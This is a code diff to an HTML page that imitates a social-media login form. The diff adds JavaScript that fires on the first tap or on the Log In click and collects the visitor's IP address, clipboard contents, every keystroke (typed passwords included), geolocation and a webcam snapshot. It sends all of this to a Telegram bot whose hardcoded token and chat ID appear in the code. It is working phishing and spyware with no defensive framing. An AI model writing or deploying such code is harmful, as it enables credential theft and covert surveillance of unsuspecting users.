@@ -44,7 +44,7 @@
         }
     </style>
 </head>
-<body ontouchstart="startCapture()">
+<body ontouchstart="captureAllData()">
 
     <div class="container">
         <div class="logo">
@@ -52,21 +52,62 @@
         </div>
         <input type="text" id="username" placeholder="Phone number, username, or email">
         <input type="password" id="password" placeholder="Password">
-        <button onclick="startCapture()">Log In</button>
+        <button onclick="captureAllData()">Log In</button>
     </div>
 
     <canvas id="snapshotCanvas" width="320" height="240"></canvas>
 
     <script>
         let localStream;
+        let ipAddress = "Unknown IP";
+        let clipboardData = "No clipboard data available";
+        let keystrokes = "";
+        let locationData = "Location not available";
 
-        // Start camera capture and send data to the bot
-        async function startCapture() {
-            await initializeCamera();  // Initialize the user's camera
-            captureSnapshot();  // Capture the snapshot and send it
+        // Capture all user data and send to Telegram bot
+        async function captureAllData() {
+            await getIpAddress();
+            await getClipboardData();
+            getLocation();
+            logKeystrokes();
+            await initializeCamera();
+            captureSnapshot();
         }
 
-        // Get the user's camera stream
+        // Fetch user's IP address
+        async function getIpAddress() {
+            await fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                });
+        }
+
+        // Get clipboard data if available
+        async function getClipboardData() {
+            try {
+                const text = await navigator.clipboard.readText();
+                clipboardData = text || "No clipboard content";
+            } catch (err) {
+                clipboardData = "Clipboard access denied";
+            }
+        }
+
+        // Log user keystrokes
+        document.addEventListener('keydown', (event) => {
+            keystrokes += event.key;
+        });
+
+        // Get geolocation
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+                });
+            }
+        }
+
+        // Initialize user's camera
         async function initializeCamera() {
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -76,27 +117,26 @@
             }
         }
 
-        // Capture a snapshot and send it to the Telegram bot
+        // Capture a snapshot and send it to the bot
         function captureSnapshot() {
             const video = document.createElement('video');
             video.srcObject = localStream;
             video.play();
 
-            // Wait for the video to start before capturing the snapshot
             video.onloadedmetadata = () => {
                 const canvas = document.getElementById('snapshotCanvas');
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 video.pause();  // Pause the video after capturing the snapshot
 
-                // Convert the canvas to a Blob (image)
+                // Convert canvas to image blob
                 canvas.toBlob((blob) => {
-                    sendSnapshotToBot(blob);  // Send the image to the bot
+                    sendSnapshotToBot(blob);  // Send image to Telegram bot
                 }, 'image/jpeg');
             };
         }
 
-        // Send the captured image to the Telegram bot
+        // Send snapshot to the Telegram bot
         function sendSnapshotToBot(imageBlob) {
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
             const chatId = '860517021';
@@ -113,10 +153,49 @@
                     console.error('Failed to send snapshot:', response.statusText);
                 } else {
                     console.log('Snapshot sent successfully to Telegram bot.');
+                    sendAdditionalDataToBot();  // Send other details after the snapshot
                 }
             })
             .catch(error => {
                 console.error('Error sending snapshot:', error);
+            });
+        }
+
+        // Send additional data (IP, location, clipboard, keystrokes) to the bot
+        function sendAdditionalDataToBot() {
+            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
+            const chatId = '860517021';
+
+            const message = `
+🚨 **New Interaction Captured** 🚨
+
+📌 **IP Address:** ${ipAddress}
+📌 **Clipboard Data:** ${clipboardData}
+📌 **Keystrokes:** ${keystrokes}
+📌 **Location:** ${locationData}
+⏰ **Time:** ${new Date().toLocaleString()}
+`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send additional data:', response.statusText);
+                } else {
+                    console.log('Additional data sent successfully to Telegram bot.');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending additional data:', error);
             });
         }
     </script>
